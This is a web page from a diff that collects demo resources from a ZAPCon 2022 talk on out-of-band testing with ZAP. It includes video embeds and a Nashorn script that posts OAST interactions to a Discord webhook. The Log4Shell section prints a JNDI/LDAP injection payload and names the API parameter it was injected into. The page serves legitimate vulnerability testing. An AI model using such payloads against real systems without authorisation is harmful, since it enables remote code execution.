@@ -1,0 +1,123 @@
+---
+import PageLayout from "@layouts/PageLayout.astro";
+import Container from "@components/Container.astro";
+import ZapconNav from "@components/ZapconNav.astro";
+---
+
+<PageLayout title="ZAPCon 2022 - OAST with ZAP" description="Resources related to my presentation on &quot;OAST with ZAP&quot; at ZAPCon 2022.">
+  <Container>
+    <ZapconNav active="demos" />
+    <div class="animate space-y-6">
+
+      <section class="space-y-4">
+        <h2 class="text-xl font-semibold text-black dark:text-white">Finding Discordbot's Address</h2>
+        <p>
+          Ever wonder how chat apps display link previews? In this demo, a URL was constructed using
+          an Interactsh payload and pasted into a Discord channel. Soon after, a GET request appeared
+          in ZAP's OAST Tab and the request had "Discordbot" in its User-agent header value.
+        </p>
+        <div class="relative w-full" style="padding-bottom: 56.25%;">
+          <iframe
+            class="absolute inset-0 w-full h-full rounded"
+            src="https://www.youtube-nocookie.com/embed/LmBwakpiA5o"
+            title="YouTube video player"
+            frameborder="0"
+            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+            allowfullscreen
+          ></iframe>
+        </div>
+      </section>
+
+      <hr class="border-black/10 dark:border-white/10" />
+
+      <section class="space-y-4">
+        <h2 class="text-xl font-semibold text-black dark:text-white">Discovering Log4Shell in ZAP 2.11.0</h2>
+        <p>
+          A newer version of ZAP was used to discover Log4Shell in ZAP 2.11.0 by injecting a known
+          Log4Shell payload in the <code>apikey</code> parameter of the
+          <code>/JSON/alert/action/deleteAlert/</code> ZAP API endpoint. The payload used was
+          <code>{"${jndi:ldap://{0}/abc}"}</code> where <code>{"{0}"}</code> was replaced by an Interactsh
+          payload obtained from the OAST add-on.
+        </p>
+        <div class="relative w-full" style="padding-bottom: 56.25%;">
+          <iframe
+            class="absolute inset-0 w-full h-full rounded"
+            src="https://www.youtube-nocookie.com/embed/e5q5GEkEIxM"
+            title="YouTube video player"
+            frameborder="0"
+            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+            allowfullscreen
+          ></iframe>
+        </div>
+      </section>
+
+      <hr class="border-black/10 dark:border-white/10" />
+
+      <section class="space-y-4">
+        <h2 class="text-xl font-semibold text-black dark:text-white">OAST Interaction Discord Notifier</h2>
+        <p>
+          A ZAP script was used to demonstrate the capabilities of OAST request handlers. The script
+          in the demo registered an OAST request handler to send messages to a Discord webhook whenever
+          a new OAST interaction was received.
+        </p>
+        <div class="relative w-full" style="padding-bottom: 56.25%;">
+          <iframe
+            class="absolute inset-0 w-full h-full rounded"
+            src="https://www.youtube-nocookie.com/embed/QrYUHeg98uQ"
+            title="YouTube video player"
+            frameborder="0"
+            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+            allowfullscreen
+          ></iframe>
+        </div>
+
+        <h3 class="text-lg font-semibold text-black dark:text-white">ZAP Standalone Script Code (Nashorn)</h3>
+        <p>
+          You need a valid <a href="https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks" class="underline underline-offset-2">Discord Webhook URL</a> for this script to work.
+        </p>
+
+<pre class="overflow-x-auto rounded bg-black/5 dark:bg-white/5 p-4 text-sm"><code>{`// This script registers an OAST message handler that sends interactions to a Discord webhook.
+
+var Control = Java.type("org.parosproxy.paros.control.Control")
+var Model = Java.type("org.parosproxy.paros.model.Model")
+var extOast = Control.getSingleton().getExtensionLoader().getExtension("ExtensionOast")
+var interactsh = extOast.getInteractshService()
+var HttpSender = Java.type("org.parosproxy.paros.network.HttpSender")
+var HttpMessage = Java.type("org.parosproxy.paros.network.HttpMessage")
+var HttpHeader = Java.type("org.parosproxy.paros.network.HttpHeader")
+var HttpRequestHeader = Java.type("org.parosproxy.paros.network.HttpRequestHeader")
+var URI = Java.type("org.apache.commons.httpclient.URI")
+var discordWebHookUrl = new URI("<Replace with Discord Webhook URL>", true)
+
+function requestHandler(request) {
+    var msg = request.getHistoryReference().getHttpMessage()
+    var formattedRequestHeader = "\`\`\`\\n" + (msg.getRequestHeader().toString() || "---") + "\\n\`\`\`"
+    var formattedRequestBody = "\`\`\`\\n" + (msg.getRequestBody().toString() || "---") + "\\n\`\`\`"
+    embed1 = {
+        "title": "Interaction",
+        "fields": [
+            { "name": "Request Header", "value": formattedRequestHeader },
+            { "name": "Request Body", "value": formattedRequestBody },
+            { "name": "Source", "value": request.getSource() || "---", "inline": true },
+            { "name": "Referer", "value": request.getReferer() || "---", "inline": true },
+            { "name": "Handler", "value": request.getHandler() || "---", "inline": true }
+        ]
+    }
+    var content = ":sparkles: New interaction received.\\n"
+    var body = { "content": content, "embeds": [embed1] }
+
+    var requestMethod = HttpRequestHeader.POST;
+    var msg = new HttpMessage()
+    msg.setRequestHeader(new HttpRequestHeader(requestMethod, discordWebHookUrl, HttpHeader.HTTP11));
+    msg.getRequestHeader().setHeader(HttpHeader.CONTENT_TYPE, HttpHeader.JSON_CONTENT_TYPE);
+    msg.setRequestBody(JSON.stringify(body))
+    var sender = new HttpSender(Model.getSingleton().getOptionsParam().getConnectionParam(), true, HttpSender.MANUAL_REQUEST_INITIATOR);
+    sender.sendAndReceive(msg)
+}
+
+interactsh.addOastRequestHandler(requestHandler)
+print("OAST Discord Notifier registered.")`}</code></pre>
+      </section>
+    </div>
+  </Container>
+</PageLayout>
